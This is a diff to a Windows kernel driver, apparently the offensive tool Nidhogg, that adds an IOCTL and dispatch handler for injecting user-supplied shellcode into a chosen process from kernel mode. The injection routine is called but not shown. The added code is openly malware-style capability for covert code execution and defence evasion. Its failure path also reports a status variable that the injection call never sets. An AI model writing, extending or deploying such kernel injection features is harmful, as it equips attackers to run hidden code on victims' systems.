@@ -29,6 +29,7 @@
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -1017,6 +1018,36 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		ObDereferenceObject(Process);
 		len += sizeof(PkgReadWriteData);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_INJECT_SHELLCODE: 
+	{
+		if (!Features.Injection) {
+			KdPrint((DRIVER_PREFIX "Due to previous error, shellcode injection feature is unavaliable.\n"));
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		if (size % sizeof(ShellcodeInformation) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (ShellcodeInformation*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->Shellcode || data->ShellcodeSize <= 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (!NT_SUCCESS(InjectShellcode(data))) {
+			KdPrint((DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status));
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Shellcode injected successfully.\n"));
 		break;
 	}
 
